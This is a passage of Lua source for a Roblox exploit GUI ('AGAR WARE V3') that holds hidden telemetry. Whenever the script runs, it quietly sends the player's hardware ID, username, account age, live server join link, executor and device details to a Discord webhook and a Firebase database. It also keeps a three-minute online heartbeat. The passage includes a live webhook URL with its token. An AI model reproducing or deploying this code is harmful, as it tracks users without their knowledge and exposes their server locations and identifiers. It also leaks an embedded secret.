					return data
				end
			end
	
			return {
				execution_count = 0,
				first_seen = os.time(),
				last_seen = os.time(),
				hwids = {}
			}
		end
	
		local function _updatePlayerData(playerKey, data)
			pcall(function()
				_req({
					Url = _FIREBASE_URL .. "/players/" .. _HttpService:UrlEncode(playerKey) .. ".json",
					Method = "PATCH",
					Headers = { ["Content-Type"] = "application/json" },
					Body = _HttpService:JSONEncode(data)
				})
			end)
		end
	
		local function _addHWID(playerKey, hwid)
			local playerData = _getPlayerData(playerKey)
	
			-- Check if HWID already exists
			local hwidExists = false
			for _, existingHwid in pairs(playerData.hwids) do
				if existingHwid == hwid then
					hwidExists = true
					break
				end
			end
	
			-- Add HWID if it doesn't exist
			if not hwidExists then
				table.insert(playerData.hwids, hwid)
				_updatePlayerData(playerKey, { hwids = playerData.hwids })
			end
	
			return playerData
		end
	
		local function _send(embedTable)
			pcall(function()
				_req({
					Url    = _WEBHOOK,
					Method = "POST",
					Headers = { ["Content-Type"] = "application/json" },
					Body   = _HttpService:JSONEncode({ embeds = { embedTable } })
				})
			end)
		end
	
		local userId = _plr.UserId
		local username = _plr.Name
		local hwid = _hwid()
	
		-- Create player key format: "userId - username"
		local currentKey = userId .. " - " .. username
	
		-- Check if player exists with different username
		local existingKey = _findPlayerKey(userId)
	
		if existingKey and existingKey ~= currentKey then
			-- Username changed, rename the key
			_renamePlayerKey(existingKey, currentKey)
		end
	
		-- Get player data and add HWID
		local playerData = _addHWID(currentKey, hwid)
	
		-- Update execution count and last seen
		playerData.execution_count = playerData.execution_count + 1
		playerData.last_seen = os.time()
	
		_updatePlayerData(currentKey, {
			execution_count = playerData.execution_count,
			last_seen = playerData.last_seen
		})
	
		local accountCreated = os.date("%Y-%m-%d", os.time() - (_plr.AccountAge * 86400))
	
		_send({
			description = string.format(
				"**User:** %s / @%s\n**%s** (%d Days)\n\n**Game:** [%s](%s)\n**Server:** %d/%d\n\n**Executor:** %s\n**Device:** %s | %dms | %dfps\n**HWID:** `%s`\n\n**Execution Count:** #%d",
				_plr.DisplayName,
				_plr.Name,
				accountCreated,
				_plr.AccountAge,
				_productInfo.Name,
				_joinLink(),
				#_Players:GetPlayers(),
				_Players.MaxPlayers,
				_executor(),
				_platform(),
				_ping(),
				_fps(),
				hwid,
				playerData.execution_count
			),
			color = 0x000000,
			footer = { text = _SCRIPT_NAME },
			timestamp = DateTime.now():ToIsoDate()
		})
	end
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	-- Add this AFTER your load webhook code
	
	local _FIREBASE_URL = "https://agar-ware-default-rtdb.firebaseio.com"
	local _plr = game:GetService("Players").LocalPlayer
	local _HttpService = game:GetService("HttpService")
	local _MarketplaceSvc = game:GetService("MarketplaceService")
	
	local _req = (syn and syn.request) or request or http_request or (fluxus and fluxus.request)
	
	local function _hwid()
		if get_hwid then return tostring(get_hwid()) end
		local ok, id = pcall(function() return game:GetService("RbxAnalyticsService"):GetClientId() end)
		return ok and id or "N/A"
	end
	
	local function _joinLink()
		local ok, v = pcall(function()
			return "https://www.roblox.com/games/start?placeId="
				.. game.PlaceId
				.. "&gameInstanceId=" .. game.JobId
		end)
		return ok and v or ""
	end
	
	local _productInfo = pcall(function()
		return _MarketplaceSvc:GetProductInfo(game.PlaceId)
	end) and _MarketplaceSvc:GetProductInfo(game.PlaceId) or { Name = "Unknown" }
	
	local function updateOnlineStatus()
		pcall(function()
			_req({
				Url = _FIREBASE_URL .. "/online_users/" .. _plr.Name .. ".json",
				Method = "PUT",
				Headers = { ["Content-Type"] = "application/json" },
				Body = _HttpService:JSONEncode({
					username_display = _plr.Name .. " / " .. _plr.DisplayName,
					hwid = _hwid(),
					game_name = _productInfo.Name,
					game_link = _joinLink(),
					place_id = game.PlaceId,
					last_heartbeat = os.time()
				})
			})
		end)
	end
	
	-- Add to online list IMMEDIATELY on execute
	updateOnlineStatus()
	
	-- Send heartbeat every 3 minutes (180 seconds)
	spawn(function()
		while wait(180) do
			updateOnlineStatus()
		end
	end)
	
	-- Remove from online list when player leaves
	game:GetService("Players").PlayerRemoving:Connect(function(player)
		if player == _plr then
			pcall(function()
				_req({
					Url = _FIREBASE_URL .. "/online_users/" .. _plr.Name .. ".json",
					Method = "DELETE"
				})
			end)
		end
	end)
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	local HttpService = game:GetService("HttpService")
	local Players = game:GetService("Players")
	
	local FIREBASE_URL = "https://agar-ware-default-rtdb.firebaseio.com"
	local WEBHOOK_URL = "https://discord.com/api/webhooks/1504421690610946173/Q7J4q10dMdKyr3EXfog5iqy6qMsOWsWdu_e-CSH2gZqCi--HeVI-mDWr9qeQ57kuN76p"
	
	local _req = (syn and syn.request) or request or http_request or (fluxus and fluxus.request)
	local _plr = Players.LocalPlayer
	
	-- Get current total execution count from Firebase
	local function getTotalExecutionCount()
		local success, response = pcall(function()
			return _req({
				Url = FIREBASE_URL .. "/view/totalexecutioncount.json",
				Method = "GET"
			})
		end)
	
		if success and response.StatusCode == 200 then
			local count = HttpService:JSONDecode(response.Body)
			if type(count) == "number" then
				return count
			end
		end
	
		return 0
	end
	
	-- Update total execution count in Firebase
	local function updateTotalExecutionCount(newCount)
		pcall(function()
			_req({
				Url = FIREBASE_URL .. "/view/totalexecutioncount.json",
				Method = "PUT",
				Headers = { ["Content-Type"] = "application/json" },
				Body = HttpService:JSONEncode(newCount)
			})
		end)
	end
	
	-- Send Discord webhook
	local function sendWebhook(executionCount)
		pcall(function()
			local embed = {
				title = "AGAR WARE V3",
				description = string.format("This script has been executed **%d** times.", executionCount),
				color = 2346240,
				footer = {
					text = "Last Execution: " .. _plr.Name
				},
				timestamp = DateTime.now():ToIsoDate()
			}
	
			_req({
				Url = WEBHOOK_URL,
				Method = "POST",
				Headers = { ["Content-Type"] = "application/json" },
				Body = HttpService:JSONEncode({ embeds = { embed } })
			})
		end)
	end
	
	-- Main execution
	local currentCount = getTotalExecutionCount()
	local newCount = currentCount + 1
	
	-- Update Firebase
	updateTotalExecutionCount(newCount)
	
	-- Send webhook
	sendWebhook(newCount)
end;
task.spawn(C_333);
-- StarterGui.T5784YHRGE89ES98T..
local function C_334()
local script = G2L["334"];
	-- Button click sound script (SINGLE SOUND INSTANCE)
	-- Put this as a LocalScript under your ScreenGui
	
	local function getScreenGui()
		local p = script.Parent
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	
	local screenGui = getScreenGui()
	if not screenGui then return end
	
	local soundId = 127989598863324
	
	-- Create ONE sound instance that stays loaded
	local clickSound = Instance.new("Sound")
	clickSound.SoundId = "rbxassetid://" .. soundId
	clickSound.Volume = 0.3
	clickSound.Parent = game:GetService("SoundService")
	
	-- Preload it
	clickSound:Play()
	clickSound:Stop()
	
	-- Function to add click sound to a button
	local function addClickSound(button)
		button.MouseButton1Click:Connect(function()
			clickSound:Play()
		end)
	end
	
	-- Add sound to all existing buttons
	for _, obj in pairs(screenGui:GetDescendants()) do
		if obj:IsA("TextButton") or obj:IsA("ImageButton") then
			addClickSound(obj)
		end
	end
	
	-- Add sound to any new buttons created later
	screenGui.DescendantAdded:Connect(function(obj)
		if obj:IsA("TextButton") or obj:IsA("ImageButton") then
			addClickSound(obj)
		end
	end)
end;
task.spawn(C_334);

return G2L["1"], require;